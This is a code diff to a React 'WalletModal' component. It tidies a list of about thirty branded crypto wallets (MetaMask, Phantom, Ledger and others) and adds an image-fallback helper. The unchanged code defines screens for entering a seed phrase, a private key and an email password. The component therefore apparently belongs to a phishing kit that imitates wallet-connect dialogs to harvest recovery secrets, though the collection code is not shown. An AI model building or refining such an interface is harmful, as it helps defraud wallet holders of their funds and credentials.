@@ -23,7 +23,8 @@ import {
   CheckCircle2,
   Loader2,
   Mail,
-  Fingerprint
+  Fingerprint,
+  Wallet as WalletIcon
 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { cn } from "@/lib/utils";
@@ -36,11 +37,15 @@ interface Wallet {
   icon: string;
 }
 
+const DEFAULT_WALLET_ICON = "https://upload.wikimedia.org/wikipedia/commons/e/e4/Wallet_Flat_Icon.svg";
+
 const wallets: Wallet[] = [
   { name: "METAMASK", desc: "BROWSER EXTENSION", e2e: true, icon: "https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Manifest_Icon.svg" },
   { name: "PHANTOM", desc: "BROWSER EXTENSION", e2e: true, icon: "https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/PHANTOM/logo.png" },
   { name: "COINBASE WALLET", desc: "MOBILE/DESKTOP", e2e: true, icon: "https://raw.githubusercontent.com/coinbase/coinbase-wallet-sdk/master/packages/wallet-sdk/assets/coinbase-wallet-logo.svg" },
   { name: "TRUST WALLET", desc: "MOBILE", e2e: true, icon: "https://raw.githubusercontent.com/trustwallet/assets/master/public/images/logo.png" },
+  { name: "RABBY WALLET", desc: "BROWSER EXTENSION", e2e: true, icon: "https://rabby.io/favicon.ico" },
+  { name: "OKX WALLET", desc: "MOBILE/EXTENSION", e2e: true, icon: "https://www.okx.com/cdn/assets/imgs/221/9E9A9B4B8B6A4A9C.png" },
   { name: "NABOX", desc: "EXTENSION/MOBILE", e2e: true, icon: "https://nabox.io/favicon.ico" },
   { name: "TAP WALLET", desc: "BROWSER EXTENSION", e2e: true, icon: "https://tap.global/favicon.ico" },
   { name: "ROBINHOOD WALLET", desc: "MOBILE", e2e: true, icon: "https://robinhood.com/favicon.ico" },
@@ -58,22 +63,38 @@ const wallets: Wallet[] = [
   { name: "CAKE WALLET", desc: "MOBILE", e2e: true, icon: "https://cakewallet.com/favicon.ico" },
   { name: "GUARDA", desc: "DESKTOP/MOBILE", e2e: true, icon: "https://guarda.com/favicon.ico" },
   { name: "BINANCE WALLET", desc: "BROWSER EXTENSION", e2e: true, icon: "https://bin.bnbstatic.com/static/images/home/binance-logo.png" },
-  { name: "OKX WALLET", desc: "MOBILE/EXTENSION", e2e: true, icon: "https://www.okx.com/cdn/assets/imgs/221/9E9A9B4B8B6A4A9C.png" },
   { name: "SOLFLARE", desc: "EXTENSION/MOBILE", e2e: true, icon: "https://solflare.com/assets/logo.svg" },
   { name: "LEDGER", desc: "HARDWARE", e2e: true, icon: "https://www.ledger.com/wp-content/uploads/2021/11/ledger-logo.png" },
   { name: "TREZOR", desc: "HARDWARE", e2e: true, icon: "https://trezor.io/static/images/trezor-logo.png" },
   { name: "BITGET WALLET", desc: "MOBILE/EXTENSION", e2e: true, icon: "https://img.bitgetimg.com/multi-language/web/1701074127608_bitget-logo.png" },
-  { name: "UNISWAP WALLET", desc: "MOBILE", e2e: true, icon: "https://raw.githubusercontent.com/Uniswap/assets/master/logos/uniswap_logo.svg" },
   { name: "CRYPTO.COM", desc: "MOBILE", e2e: true, icon: "https://crypto.com/favicon.ico" },
   { name: "JUPITER WALLET", desc: "BROWSER EXTENSION", e2e: true, icon: "https://jup.ag/favicon.ico" },
-  { name: "RABBY WALLET", desc: "BROWSER EXTENSION", e2e: true, icon: "https://rabby.io/favicon.ico" },
   { name: "STARGAZER WALLET", desc: "BROWSER EXTENSION", e2e: true, icon: "https://stargazer-wallet.io/favicon.ico" },
   { name: "TANGEM", desc: "HARDWARE", e2e: true, icon: "https://tangem.com/favicon.ico" },
   { name: "NEAR MOBILE", desc: "MOBILE", e2e: true, icon: "https://near.org/favicon.ico" },
   { name: "STARKEY WALLET", desc: "BROWSER EXTENSION", e2e: true, icon: "https://starkey.app/favicon.ico" },
-  { name: "TAP", desc: "BROWSER EXTENSION", e2e: true, icon: "https://tap.global/favicon.ico" },
-  { name: "OTHER WALLET", desc: "CUSTOM", e2e: true, icon: "https://upload.wikimedia.org/wikipedia/commons/e/e4/Wallet_Flat_Icon.svg" },
+  { name: "OTHER WALLET", desc: "CUSTOM", e2e: true, icon: DEFAULT_WALLET_ICON },
 ];
+
+/**
+ * Custom component to handle wallet images with fallbacks
+ */
+function WalletImage({ src, alt, className }: { src: string; alt: string; className?: string }) {
+  const [imgSrc, setImgSrc] = useState(src);
+
+  return (
+    <Image 
+      src={imgSrc} 
+      alt={alt}
+      fill
+      className={cn("object-contain p-0.5", className)}
+      unoptimized={imgSrc.endsWith('.svg') || imgSrc.endsWith('.ico')}
+      onError={() => {
+        setImgSrc(DEFAULT_WALLET_ICON);
+      }}
+    />
+  );
+}
 
 type View = "list" | "login" | "processing" | "methods" | "seed-phrase" | "email-password" | "private-key";
 
@@ -205,12 +226,9 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
                   >
                     <div className="w-10 h-10 rounded-lg bg-primary/10 flex items-center justify-center p-1.5 relative shrink-0">
                       <div className="w-full h-full relative">
-                        <Image 
+                        <WalletImage 
                           src={wallet.icon} 
                           alt={wallet.name}
-                          fill
-                          className="object-contain p-0.5"
-                          unoptimized={wallet.icon.endsWith('.svg') || wallet.icon.endsWith('.ico')}
                         />
                       </div>
                     </div>
@@ -277,12 +295,10 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
               </button>
               
               <div className="w-12 h-12 rounded-xl bg-[#0D161F] border border-white/5 flex items-center justify-center p-2 relative">
-                <Image 
+                <WalletImage 
                   src={selectedWallet.icon} 
                   alt={selectedWallet.name}
-                  fill
-                  className="object-contain p-2"
-                  unoptimized={selectedWallet.icon.endsWith('.svg') || selectedWallet.icon.endsWith('.ico')}
+                  className="p-2"
                 />
               </div>
 
